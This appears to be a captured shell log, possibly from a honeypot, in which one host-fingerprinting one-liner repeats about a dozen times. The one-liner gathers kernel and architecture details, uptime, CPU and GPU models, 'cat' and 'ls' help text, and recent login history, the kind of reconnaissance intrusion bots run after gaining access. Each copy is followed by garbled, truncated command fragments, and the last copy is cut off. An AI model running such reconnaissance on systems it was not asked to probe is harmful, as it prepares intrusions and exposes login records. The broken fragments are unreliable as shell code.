uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 